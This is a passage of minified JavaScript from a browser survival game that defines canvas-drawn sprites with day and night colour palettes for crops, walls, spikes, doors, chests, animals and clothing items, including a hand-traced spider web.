                    sprite[ze.CARROT_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#c98e2f", "#a36b11"])),
                    sprite[ze.CARROT_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#043c37", "#032b23"])),
                    sprite[ze.TOMATO_SEED_MOB] = [],
                    sprite[ze.TOMATO_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#b22419", "#99110e"])),
                    sprite[ze.TOMATO_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#04323c", "#03222b"])),
                    sprite[ze.WATERMELON_SEED_MOB] = [],
                    sprite[ze.WATERMELON_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#13a56d", "#098a58"])),
                    sprite[ze.WATERMELON_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#043c37", "#032b23"])),
                    sprite[ze.WINDMILL_WHEAT_SEED] = O(1, [{
                        f: m1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#A89F67", "#9E8456"]
                    }], 1.2, ["#d2c77b", "#e7dc8f", "#bfb360"], .7),
                    sprite[ze.BREAD_OVEN_WOOD] = O(1, [{
                        f: P1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#4d2d14", "#432516"]
                    }], .3, ["#d2c77b", "#e7dc8f", "#bfb360"], .7),
                    sprite[ze.BREAD_OVEN_BREAD] = O(1, [{
                        f: i0,
                        x: 0,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#1d051e", "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
                    }], .15, ["#d2c77b", "#e7dc8f", "#bfb360"], .7),
                    sprite[ze.EMPTY_SLOT] = O(.9, [], .3, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.PLANT_SEED] = [],
                    sprite[ze.PLANT_SEED][ze.DAY] = c(T1(.9, 0, ["#7d613e", "#9e7e5a"])),
                    sprite[ze.PLANT_SEED][ze.NIGHT] = c(T1(.9, 0, ["#084442", "#125e5a"])),
                    sprite[ze.WHEAT_SEED] = [],
                    sprite[ze.WHEAT_SEED][ze.DAY] = c(T1(.9, 0, ["#9E8456", "#A89F67"])),
                    sprite[ze.WHEAT_SEED][ze.NIGHT] = c(T1(.9, 0, ["#1b6f6a", "#0d4e4c"])),
                    sprite[ze.WHEAT_SEED_DRIED] = [],
                    sprite[ze.WHEAT_SEED_DRIED][ze.DAY] = c(T1(.9, 0, ["#665329", "#68622D"])),
                    sprite[ze.WHEAT_SEED_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#083326", "#0F3A24"])),
                    sprite[ze.PLANT_PUMPKIN] = [],
                    sprite[ze.PLANT_PUMPKIN][ze.DAY] = c(T1(.9, 0, ["#c67933", "#ec952d"])),
                    sprite[ze.PLANT_PUMPKIN][ze.NIGHT] = c(T1(.9, 0, ["#0e6553", "#094437"])),
                    sprite[ze.PLANT_ALOE_VERA] = [],
                    sprite[ze.PLANT_ALOE_VERA][ze.DAY] = c(T1(.9, 0, ["#375809", "#4b770e"])),
                    sprite[ze.PLANT_ALOE_VERA][ze.NIGHT] = c(T1(.9, 0, ["#09542d", "#0d5d2f"])),
                    sprite[ze.PLANT_ALOE_VERA_DRIED] = [],
                    sprite[ze.PLANT_ALOE_VERA_DRIED][ze.DAY] = c(T1(.9, 0, ["#585809", "#72770e"])),
                    sprite[ze.PLANT_ALOE_VERA_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#295209", "#305d0d"])),
                    sprite[ze.PLANT_GARLIC] = [],
                    sprite[ze.PLANT_GARLIC][ze.DAY] = c(T1(.9, 0, ["#b9b094", "#e2d2c0"])),
                    sprite[ze.PLANT_GARLIC][ze.NIGHT] = c(T1(.9, 0, ["#126366", "#0d484b"])),
                    sprite[ze.PLANT_THORNBUSH] = [],
                    sprite[ze.PLANT_THORNBUSH][ze.DAY] = c(T1(.9, 0, ["#3f8662", "#30915d"])),
                    sprite[ze.PLANT_THORNBUSH][ze.NIGHT] = c(T1(.9, 0, ["#0e6553", "#094437"])),
                    sprite[ze.PLANT_PUMPKIN_DRIED] = [],
                    sprite[ze.PLANT_PUMPKIN_DRIED][ze.DAY] = c(T1(.9, 0, ["#c79153", "#dfa868"])),
                    sprite[ze.PLANT_PUMPKIN_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#073927", "#075040"])),
                    sprite[ze.PLANT_GARLIC_DRIED] = [],
                    sprite[ze.PLANT_GARLIC_DRIED][ze.DAY] = c(T1(.9, 0, ["#768b5b", "#819984"])),
                    sprite[ze.PLANT_GARLIC_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#0c4540", "#0e5153"])),
                    sprite[ze.PLANT_THORNBUSH_DRIED] = [],
                    sprite[ze.PLANT_THORNBUSH_DRIED][ze.DAY] = c(T1(.9, 0, ["#567465", "#627c6e"])),
                    sprite[ze.PLANT_THORNBUSH_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#073927", "#075040"])),
                    sprite[ze.PLANT_CARROT] = [],
                    sprite[ze.PLANT_CARROT][ze.DAY] = c(T1(.9, 0, ["#996b3a", "#bf956b"])),
                    sprite[ze.PLANT_CARROT][ze.NIGHT] = c(T1(.9, 0, ["#0e6553", "#094437"])),
                    sprite[ze.PLANT_CARROT_DRIED] = [],
                    sprite[ze.PLANT_CARROT_DRIED][ze.DAY] = c(T1(.9, 0, ["#7a634a", "#a68f77"])),
                    sprite[ze.PLANT_CARROT_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#1e4d43", "#113c32"])),
                    sprite[ze.PLANT_TOMATO] = [],
                    sprite[ze.PLANT_TOMATO][ze.DAY] = c(T1(.9, 0, ["#99403c", "#bc796c"])),
                    sprite[ze.PLANT_TOMATO][ze.NIGHT] = c(T1(.9, 0, ["#1e434d", "#11303c"])),
                    sprite[ze.PLANT_TOMATO_DRIED] = [],
                    sprite[ze.PLANT_TOMATO_DRIED][ze.DAY] = c(T1(.9, 0, ["#88504e", "#b3857c"])),
                    sprite[ze.PLANT_TOMATO_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#253b41", "#162930"])),
                    sprite[ze.PLANT_WATERMELON] = [],
                    sprite[ze.PLANT_WATERMELON][ze.DAY] = c(T1(.9, 0, ["#0f8870", "#23af93"])),
                    sprite[ze.PLANT_WATERMELON][ze.NIGHT] = c(T1(.9, 0, ["#032829", "#083233"])),
                    sprite[ze.PLANT_WATERMELON_DRIED] = [],
                    sprite[ze.PLANT_WATERMELON_DRIED][ze.DAY] = c(T1(.9, 0, ["#618a20", "#84a74e"])),
                    sprite[ze.PLANT_WATERMELON_DRIED][ze.NIGHT] = c(T1(.9, 0, ["#1f4632", "#335d47"])),
                    sprite[ze.WORKBENCH] = [],
                    sprite[ze.WORKBENCH][ze.DAY] = c(O1(1.2, !0, ["#0d1b1c", "#4d2d14", "#432516", "#756e52", "#663f22", "#9e9577"])),
                    sprite[ze.WORKBENCH][ze.NIGHT] = c(O1(1.2, !0, ["#030d14", "#0d2e33", "#072322", "#3e706b", "#123d3f", "#4e827c"])),
                    sprite[ze.WALL] = [],
                    sprite[ze.WALL][ze.DAY] = c(Dt(1, !0, ["#0d1b1c", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"])),
                    sprite[ze.WALL][ze.NIGHT] = c(Dt(1, !0, ["#030d14", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"])),
                    sprite[ze.DIAMOND_WALL] = [],
                    sprite[ze.DIAMOND_WALL][ze.DAY] = c(vt(1, !0, ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"])),
                    sprite[ze.DIAMOND_WALL][ze.NIGHT] = c(vt(1, !0, ["#030d14", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"])),
                    sprite[ze.AMETHYST_WALL] = [],
                    sprite[ze.AMETHYST_WALL][ze.DAY] = c(Lt(1, !0, ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"])),
                    sprite[ze.AMETHYST_WALL][ze.NIGHT] = c(Lt(1, !0, ["#030d14", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"])),
                    sprite[ze.STONE_WALL] = [],
                    sprite[ze.STONE_WALL][ze.DAY] = c(Lt(1, !0, ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"])),
                    sprite[ze.STONE_WALL][ze.NIGHT] = c(Lt(1, !0, ["#030d14", "#163a3a", "#214c4b", "#1f4948", "#295957", "#1f5955"])),
                    sprite[ze.GOLD_WALL] = [],
                    sprite[ze.GOLD_WALL][ze.DAY] = c(Gt(1, !0, ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"])),
                    sprite[ze.GOLD_WALL][ze.NIGHT] = c(Gt(1, !0, ["#030d14", "#1f4948", "#215e55", "#1f6058", "#2a7773", "#2c7a70"])),
                    sprite[ze.SPIKE] = [],
                    sprite[ze.SPIKE][ze.DAY] = c(ii(.8, !0, ["#0d1b1c", "#5f6061", "#939393", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"])),
                    sprite[ze.SPIKE][ze.NIGHT] = c(ii(.8, !0, ["#030d14", "#1f343f", "#485e66", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"])),
                    sprite[ze.GOLD_SPIKE] = [],
                    sprite[ze.GOLD_SPIKE][ze.DAY] = c(ri(.8, !0, ["#0d1b1c", "#69685a", "#9c9683", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"])),
                    sprite[ze.GOLD_SPIKE][ze.NIGHT] = c(ri(.8, !0, ["#030d14", "#1a3732", "#1e544c", "#1f4948", "#215e55", "#1f6058", "#2a7773", "#2c7a70"])),
                    sprite[ze.DIAMOND_SPIKE] = [],
                    sprite[ze.DIAMOND_SPIKE][ze.DAY] = c(oi(.8, !0, ["#0d1b1c", "#7d8b90", "#9facaa", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"])),
                    sprite[ze.DIAMOND_SPIKE][ze.NIGHT] = c(oi(.8, !0, ["#030d14", "#2c4b55", "#546d77", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"])),
                    sprite[ze.STONE_SPIKE] = [],
                    sprite[ze.STONE_SPIKE][ze.DAY] = c(ni(.8, !0, ["#0d1b1c", "#6a7570", "#939393", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"])),
                    sprite[ze.STONE_SPIKE][ze.NIGHT] = c(ni(.8, !0, ["#030d14", "#1f343f", "#485e66", "#163a3a", "#214c4b", "#1f4948", "#295957", "#1f5955"])),
                    sprite[ze.AMETHYST_SPIKE] = [],
                    sprite[ze.AMETHYST_SPIKE][ze.DAY] = c(ni(.8, !0, ["#0d1b1c", "#6a7570", "#939393", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"])),
                    sprite[ze.AMETHYST_SPIKE][ze.NIGHT] = c(ni(.8, !0, ["#030d14", "#1f343f", "#485e66", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"])),
                    sprite[ze.DOOR_WOOD_CLOSE] = [],
                    sprite[ze.DOOR_WOOD_CLOSE][ze.DAY] = c(yt(1.5, !0, ["#0d1b1c", "#4c3b19", "#574122", "#644928", "#574122", "#735534", "#23a54e", "#1f934a", "#208e48", "#b12c2a", "#9c2625", "#ebd6a4", "#cca73f"])),
                    sprite[ze.DOOR_WOOD_CLOSE][ze.NIGHT] = c(yt(1.5, !0, ["#030d14", "#0d2e33", "#184747", "#123b3f", "#0d2e33", "#174444"])),
                    sprite[ze.DOOR_WOOD_OPEN] = [],
                    sprite[ze.DOOR_WOOD_OPEN][ze.DAY] = c(yt(1, !1, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"])),
                    sprite[ze.DOOR_WOOD_OPEN][ze.NIGHT] = c(yt(1, !1, ["#042b30", "#042b30", "#0b342b", "#0b342b", "#042b30", "#0b342b"])),
                    sprite[ze.DOOR_STONE_CLOSE] = [],
                    sprite[ze.DOOR_STONE_CLOSE][ze.DAY] = c(Ht(1.5, !0, ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#8a938e", "#adbcb5"])),
                    sprite[ze.DOOR_STONE_CLOSE][ze.NIGHT] = c(Ht(1.5, !0, ["#030d14", "#163a3a", "#214c4b", "#1f4948", "#164542", "#295957"])),
                    sprite[ze.DOOR_STONE_OPEN] = [],
                    sprite[ze.DOOR_STONE_OPEN][ze.DAY] = c(Ht(1, !1, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"])),
                    sprite[ze.DOOR_STONE_OPEN][ze.NIGHT] = c(Ht(1, !1, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"])),
                    sprite[ze.DOOR_AMETHYST_CLOSE] = [],
                    sprite[ze.DOOR_AMETHYST_CLOSE][ze.DAY] = c(Ht(1.5, !0, ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"])),
                    sprite[ze.DOOR_AMETHYST_CLOSE][ze.NIGHT] = c(Ht(1.5, !0, ["#030d14", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"])),
                    sprite[ze.DOOR_AMETHYST_OPEN] = [],
                    sprite[ze.DOOR_AMETHYST_OPEN][ze.DAY] = c(Ht(1, !1, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"])),
                    sprite[ze.DOOR_AMETHYST_OPEN][ze.NIGHT] = c(Ht(1, !1, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"])),
                    sprite[ze.DOOR_GOLD_CLOSE] = [],
                    sprite[ze.DOOR_GOLD_CLOSE][ze.DAY] = c(Pt(1.5, !0, ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#9a8636", "#c1b06b"])),
                    sprite[ze.DOOR_GOLD_CLOSE][ze.NIGHT] = c(Pt(1.5, !0, ["#030d14", "#1f4948", "#215e55", "#1f6058", "#1f605c", "#2c7a70"])),
                    sprite[ze.DOOR_GOLD_OPEN] = [],
                    sprite[ze.DOOR_GOLD_OPEN][ze.DAY] = c(Pt(1, !1, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"])),
                    sprite[ze.DOOR_GOLD_OPEN][ze.NIGHT] = c(Pt(1, !1, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"])),
                    sprite[ze.DOOR_DIAMOND_CLOSE] = [],
                    sprite[ze.DOOR_DIAMOND_CLOSE][ze.DAY] = c(wt(1.5, !0, ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"])),
                    sprite[ze.DOOR_DIAMOND_CLOSE][ze.NIGHT] = c(wt(1.5, !0, ["#030d14", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"])),
                    sprite[ze.DOOR_DIAMOND_OPEN] = [],
                    sprite[ze.DOOR_DIAMOND_OPEN][ze.DAY] = c(wt(1, !1, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"])),
                    sprite[ze.DOOR_DIAMOND_OPEN][ze.NIGHT] = c(wt(1, !1, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"])),
                    sprite[ze.CHEST] = [],
                    sprite[ze.CHEST][ze.DAY] = c(Qt(.5, 0, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"])),
                    sprite[ze.CHEST][ze.NIGHT] = c(Qt(.5, 0, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453", "#1f5453", "#1f5453", "#2b6664", "#2b6664", "#2b6664"])),
                    sprite[ze.TREASURE_CHEST] = [],
                    sprite[ze.TREASURE_CHEST][ze.DAY] = c(D0(.5, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627"])),
                    sprite[ze.TREASURE_CHEST][ze.NIGHT] = c(D0(.5, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453"])),
                    sprite[ze.RABBIT] = [],
                    sprite[ze.RABBIT][ze.DAY] = c(g1(.9, ["#0e3022", "#ee97bf", "#FFFFFF", "#000000", "#ffffff"])),
                    sprite[ze.RABBIT][ze.NIGHT] = c(g1(.9, ["#030d14", "#4d1b59", "#5d3f77", "#220e26", "#ffffff"])),
                    sprite[ze.SPIDER] = [],
                    sprite[ze.SPIDER][ze.DAY] = c(I(Math.PI, C1(.9, ["#000000", "#b7252c", "#b7252c", "#b7252c", "#FFFFFF", "#000000"]))),
                    sprite[ze.SPIDER][ze.NIGHT] = c(I(Math.PI, C1(.9, ["#030d14", "#401d49", "#b7252c", "#401d49", "#FFFFFF", "#000000"]))),
                    sprite[ze.WEB] = c((E = .6,
                        r = ["#FFFFFF"],
                        T = document.createElement("canvas"),
                        s = T.getContext("2d"),
                        T.width = 450 * E,
                        T.height = 470 * E,
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(226.5 * E, 91.546875 * E),
                        s.bezierCurveTo(254.5 * E, 115.546875 * E, 261.5 * E, 115.546875 * E, 294.5 * E, 109.546875 * E),
                        s.bezierCurveTo(299.5 * E, 141.546875 * E, 315.5 * E, 151.546875 * E, 344.5 * E, 158.546875 * E),
                        s.bezierCurveTo(330.5 * E, 195.546875 * E, 341.5 * E, 207.546875 * E, 361.5 * E, 226.546875 * E),
                        s.bezierCurveTo(331.5 * E, 251.546875 * E, 335.5 * E, 270.546875 * E, 342.5 * E, 295.546875 * E),
                        s.bezierCurveTo(300.5 * E, 296.546875 * E, 293.5 * E, 325.546875 * E, 292.5 * E, 344.546875 * E),
                        s.bezierCurveTo(257.5 * E, 326.546875 * E, 242.5 * E, 338.546875 * E, 224.5 * E, 361.546875 * E),
                        s.bezierCurveTo(200.5 * E, 329.546875 * E, 180.5 * E, 334.546875 * E, 155.5 * E, 341.546875 * E),
                        s.bezierCurveTo(146.5 * E, 307.546875 * E, 140.5 * E, 302.546875 * E, 107.5 * E, 292.546875 * E),
                        s.bezierCurveTo(117.5 * E, 253.546875 * E, 109.5 * E, 244.546875 * E, 89.5 * E, 224.546875 * E),
                        s.bezierCurveTo(118.5 * E, 191.546875 * E, 114.5 * E, 182.546875 * E, 108.5 * E, 156.546875 * E),
                        s.bezierCurveTo(143.5 * E, 149.546875 * E, 150.5 * E, 136.546875 * E, 157.5 * E, 106.546875 * E),
                        s.bezierCurveTo(202.5 * E, 120.546875 * E, 211.5 * E, 103.546875 * E, 228.5 * E, 91.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(224.5 * E, 129.546875 * E),
                        s.bezierCurveTo(247.5 * E, 147.546875 * E, 252.5 * E, 143.546875 * E, 274.5 * E, 141.546875 * E),
                        s.bezierCurveTo(279.5 * E, 163.546875 * E, 289.5 * E, 168.546875 * E, 311.5 * E, 178.546875 * E),
                        s.bezierCurveTo(301.5 * E, 199.546875 * E, 307.5 * E, 213.546875 * E, 323.5 * E, 226.546875 * E),
                        s.bezierCurveTo(303.5 * E, 240.546875 * E, 303.5 * E, 255.546875 * E, 312.5 * E, 275.546875 * E),
                        s.bezierCurveTo(281.5 * E, 278.546875 * E, 276.5 * E, 291.546875 * E, 272.5 * E, 313.546875 * E),
                        s.bezierCurveTo(248.5 * E, 301.546875 * E, 239.5 * E, 310.546875 * E, 224.5 * E, 324.546875 * E),
                        s.bezierCurveTo(211.5 * E, 304.546875 * E, 199.5 * E, 301.546875 * E, 176.5 * E, 309.546875 * E),
                        s.bezierCurveTo(165.5 * E, 276.546875 * E, 159.5 * E, 275.546875 * E, 138.5 * E, 274.546875 * E),
                        s.bezierCurveTo(148.5 * E, 248.546875 * E, 140.5 * E, 237.546875 * E, 125.5 * E, 225.546875 * E),
                        s.bezierCurveTo(145.5 * E, 205.546875 * E, 146.5 * E, 195.546875 * E, 142.5 * E, 176.546875 * E),
                        s.bezierCurveTo(173.5 * E, 164.546875 * E, 173.5 * E, 155.546875 * E, 178.5 * E, 140.546875 * E),
                        s.bezierCurveTo(214.5 * E, 143.546875 * E, 214.5 * E, 135.546875 * E, 226.5 * E, 129.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(224.5 * E, 160.546875 * E),
                        s.bezierCurveTo(236.5 * E, 168.546875 * E, 239.5 * E, 168.546875 * E, 258.5 * E, 168.546875 * E),
                        s.bezierCurveTo(261.5 * E, 185.546875 * E, 268.5 * E, 187.546875 * E, 282.5 * E, 192.546875 * E),
                        s.bezierCurveTo(277.5 * E, 208.546875 * E, 283.5 * E, 216.546875 * E, 289.5 * E, 228.546875 * E),
                        s.bezierCurveTo(277.5 * E, 243.546875 * E, 280.5 * E, 253.546875 * E, 281.5 * E, 260.546875 * E),
                        s.bezierCurveTo(264.5 * E, 260.546875 * E, 259.5 * E, 269.546875 * E, 256.5 * E, 283.546875 * E),
                        s.bezierCurveTo(244.5 * E, 276.546875 * E, 232.5 * E, 283.546875 * E, 223.5 * E, 291.546875 * E),
                        s.bezierCurveTo(213.5 * E, 276.546875 * E, 205.5 * E, 278.546875 * E, 190.5 * E, 281.546875 * E),
                        s.bezierCurveTo(181.5 * E, 262.546875 * E, 173.5 * E, 259.546875 * E, 165.5 * E, 258.546875 * E),
                        s.bezierCurveTo(169.5 * E, 239.546875 * E, 167.5 * E, 233.546875 * E, 157.5 * E, 225.546875 * E),
                        s.bezierCurveTo(169.5 * E, 208.546875 * E, 170.5 * E, 203.546875 * E, 168.5 * E, 192.546875 * E),
                        s.bezierCurveTo(181.5 * E, 187.546875 * E, 188.5 * E, 179.546875 * E, 192.5 * E, 168.546875 * E),
                        s.bezierCurveTo(216.5 * E, 170.546875 * E, 218.5 * E, 163.546875 * E, 225.5 * E, 160.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(205.5 * E, 194.546875 * E),
                        s.bezierCurveTo(216.5 * E, 192.546875 * E, 219.5 * E, 191.546875 * E, 225.5 * E, 185.546875 * E),
                        s.bezierCurveTo(232.5 * E, 193.546875 * E, 237.5 * E, 191.546875 * E, 246.5 * E, 192.546875 * E),
                        s.bezierCurveTo(249.5 * E, 202.546875 * E, 253.5 * E, 205.546875 * E, 258.5 * E, 207.546875 * E),
                        s.bezierCurveTo(259.5 * E, 222.546875 * E, 256.5 * E, 223.546875 * E, 265.5 * E, 226.546875 * E),
                        s.bezierCurveTo(256.5 * E, 231.546875 * E, 255.5 * E, 241.546875 * E, 259.5 * E, 248.546875 * E),
                        s.bezierCurveTo(250.5 * E, 245.546875 * E, 245.5 * E, 252.546875 * E, 243.5 * E, 260.546875 * E),
                        s.bezierCurveTo(234.5 * E, 256.546875 * E, 229.5 * E, 258.546875 * E, 223.5 * E, 265.546875 * E),
                        s.bezierCurveTo(218.5 * E, 255.546875 * E, 213.5 * E, 257.546875 * E, 204.5 * E, 261.546875 * E),
                        s.bezierCurveTo(203.5 * E, 251.546875 * E, 198.5 * E, 248.546875 * E, 189.5 * E, 244.546875 * E),
                        s.bezierCurveTo(194.5 * E, 237.546875 * E, 192.5 * E, 231.546875 * E, 184.5 * E, 225.546875 * E),
                        s.bezierCurveTo(191.5 * E, 211.546875 * E, 192.5 * E, 209.546875 * E, 190.5 * E, 204.546875 * E),
                        s.bezierCurveTo(200.5 * E, 204.546875 * E, 204.5 * E, 198.546875 * E, 207.5 * E, 194.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(149.5 * E, 93.546875 * E),
                        s.bezierCurveTo(287.5 * E, 332.546875 * E, 226 * E, 225.546875 * E, 302.5 * E, 357.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(224.5 * E, 66.546875 * E),
                        s.bezierCurveTo(224.5 * E, 223.546875 * E, 224.5 * E, 223.546875 * E, 224.5 * E, 380.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(302.5 * E, 88.546875 * E),
                        s.bezierCurveTo(222.5 * E, 227.546875 * E, 222.5 * E, 227.546875 * E, 142.5 * E, 366.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(361.5 * E, 147.546875 * E),
                        s.bezierCurveTo(223 * E, 226.546875 * E, 223 * E, 226.546875 * E, 84.5 * E, 305.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(379.5 * E, 225.546875 * E),
                        s.bezierCurveTo(221 * E, 225.546875 * E, 221 * E, 225.546875 * E, 62.5 * E, 225.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(90.5 * E, 147.546875 * E),
                        s.bezierCurveTo(226.5 * E, 226.546875 * E, 226.5 * E, 226.546875 * E, 362.5 * E, 305.546875 * E),
                        s.closePath(),
                        he(s, void 0, r[0], 4),
                        T)),
                    sprite[ze.WOLF] = [],
                    sprite[ze.WOLF][ze.DAY] = c(p1(1.1, ["#0e3022", "#231f20", "#b7252c", "#7d7679", "#ffffff"])),
                    sprite[ze.WOLF][ze.NIGHT] = c(p1(1.1, ["#030d14", "#1e181c", "#462966", "#3e3e4a", "#ffffff"])),
                    sprite[ze.EARMUFFS] = [],
                    sprite[ze.EARMUFFS][ze.DAY] = c(ei(.6, 0, ["#f9efeb", "#dfd1cb", "#3e3c25", "#4d4a2e"])),
                    sprite[ze.EARMUFFS][ze.NIGHT] = c(ei(.6, 0, ["#478e8b", "#327e73", "#073030", "#08403f"])),
                    sprite[ze.COAT] = [],
                    sprite[ze.COAT][ze.DAY] = c(Wt(.6, 0, ["#3e3c25", "#4d4a2e", "#f9efeb", "#dfd1cb"])),
                    sprite[ze.COAT][ze.NIGHT] = c(Wt(.6, 0, ["#073030", "#08403f", "#478e8b", "#327e73"])),
                    sprite[ze.CAP_SCARF] = [],
                    sprite[ze.CAP_SCARF][ze.DAY] = c(ti(.63, !0, ["#171a19", "#dee7e7", "#b8cccb", "#ffffff", "#e3e8e8"])),
                    sprite[ze.CAP_SCARF][ze.NIGHT] = c(ti(.63, !0, ["#073030", "#368981", "#1c635e", "#7bbab4", "#469e95"])),
                    sprite[ze.CHRISTMAS_HAT] = [],
                    sprite[ze.CHRISTMAS_HAT][ze.DAY] = c(W1(.6, 0, ["#171a19", "#c5232c", "#84191d", "#a72027", "#fef4f4", "#e9dad9"])),
                    sprite[ze.CHRISTMAS_HAT][ze.NIGHT] = c(W1(.6, 0, ["#073030", "#392966", "#2a194f", "#433379", "#66aaa3", "#469e95"])),
                    sprite[ze.ELF_HAT] = [],
                    sprite[ze.ELF_HAT][ze.DAY] = c(w1(.6, 0, ["#171a19", "#0f964c", "#106e3b", "#138344", "#fef4f4", "#e9dad9", "#C5232C", "#A92D2D"])),
                    sprite[ze.ELF_HAT][ze.NIGHT] = c(w1(.6, 0, ["#073030", "#124949", "#0e3838", "#15514f", "#66aaa3", "#469e95", "#292f66", "#202559"])),
                    sprite[ze.BREAD_OVEN_ON] = [],
                    sprite[ze.BREAD_OVEN_ON][ze.DAY] = c(r0(.42, !0, ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#343d39"])),
                    sprite[ze.BREAD_OVEN_ON][ze.NIGHT] = c(r0(.42, !0, ["#0d1b1c", "#485E66", "#1F343F", "#60757D", "#C1C0C0", "#be8d50", "#7d5234", "#1F343F", "#344B51", "#D8E57F", "#dfa64e", "#192225"])),
                    sprite[ze.BREAD_LIGHT_UP] = [],
                    sprite[ze.BREAD_LIGHT_UP][ze.DAY] = c(o0(.9, ["#e4c027"])),
                    sprite[ze.BREAD_LIGHT_UP][ze.NIGHT] = c(o0(.9, ["#D8E57F"])),
                    sprite[ze.BREAD_OVEN_OFF] = [],
                    sprite[ze.BREAD_OVEN_OFF][ze.DAY] = c(n0(.42, !0, ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"])),
                    sprite[ze.BREAD_OVEN_OFF][ze.NIGHT] = c(n0(.42, !0, ["#0d1b1c", "#485E66", "#1F343F", "#60757D", "#C1C0C0", "#be8d50", "#7d5234", "#1F343F", "#344B51", "#D8E57F", "#dfa64e", "#1b2529"])),
                    sprite[ze.BREAD_OVEN_UI] = c((E = 1,
                        s = ["#596560", "#394841", "#543B1C", "#694D28", "#7E8A85", "#384740", "#525956"],
                        r = document.createElement("canvas"),
                        T = r.getContext("2d"),
                        r.width = 149 * E,
                        r.height = 356 * E,
                        T.save(),
                        T.translate(74.5 * E, 177.5 * E),
